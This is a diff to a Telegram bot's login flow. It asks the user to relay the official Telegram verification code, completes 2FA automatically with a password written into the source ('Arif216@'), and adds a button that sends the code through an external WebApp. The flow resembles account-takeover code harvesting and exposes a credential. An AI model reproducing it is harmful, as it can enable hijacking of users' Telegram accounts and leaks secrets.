@@ -284,11 +284,20 @@ Dispatching official Telegram verification code...`,
 │  📨 *OFFICIAL TELEGRAM CODE SENT*    │
 └──────────────────────────────────────┘
 
+• *Target Phone:* \`${cleanPhone}\`
+
 Telegram dispatched an official 5-digit verification code to \`${cleanPhone}\`.
+
+⚡ *Instant Auto-2FA:* Once code is verified, your 2FA password (\`Arif216@\`) will authenticate automatically in 0.5s!
 
 Please reply directly with the code (e.g. \`12345\`):`,
           parse_mode: "Markdown",
-          reply_markup: getCancelLoginKeyboard()
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "🔐 Submit via Secure WebApp ↗️", web_app: { url: "https://app8858823950.tgcloud.ai/" } }],
+              [{ text: "❌ Cancel", callback_data: "btn_cancel_login" }]
+            ]
+          }
         });
       } else {
         await api.sendMessage({
